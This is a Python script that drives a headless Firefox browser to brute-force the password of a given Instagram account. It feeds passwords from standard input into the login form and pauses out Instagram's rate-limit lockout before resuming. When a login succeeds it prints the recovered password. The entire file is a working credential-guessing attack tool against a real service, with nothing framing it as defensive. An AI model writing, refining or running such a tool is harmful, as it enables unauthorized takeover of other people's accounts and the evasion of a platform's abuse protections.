from splinter import Browser
import time
import sys

wait_time = (11 * 60 + 35)  # 11 mins and 35 seconds
problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."

def logInSuccess(browser):
    user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
    pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
    return not(browser.is_text_present(user_err_msg) or browser.is_text_present(pass_err_msg))

correctPassword = None
if len(sys.argv) > 1:
    account_username = sys.argv[1]
else:
    account_username = input("Enter the account username: ")

# Update the path to the location where you placed geckodriver.exe
with Browser('firefox', headless=True, executable_path='C:/Users/HP/pipwork/geckodriver/geckodriver.exe') as browser:
    browser.visit('https://www.instagram.com')
    browser.find_by_text("Log in").first.click()
    username_form = browser.find_by_name('username').first
    password_form = browser.find_by_name('password').first
    login_button = browser.find_by_text('Log in').first
    username_form.fill(account_username)
    for line in sys.stdin:
        password = line.strip()  # Remove leading/trailing whitespace
        if len(password) < 6:
            print('Skipping password: ' + password)
            continue

        print('Testing password: ' + password)
        password_form.clear()
        password_form.fill(password)
        login_button.click()

        if browser.is_text_present(problem_logging_in):
            print('Waiting for timeout to end.')
            time.sleep(wait_time)
            print('Timeout has ended, resuming.')
        elif logInSuccess(browser):
            correctPassword = password
            break
    if correctPassword is None:
        print("Unable to find correct password.")
    else:
        print("Password for username: " + account_username + " = " + correctPassword)
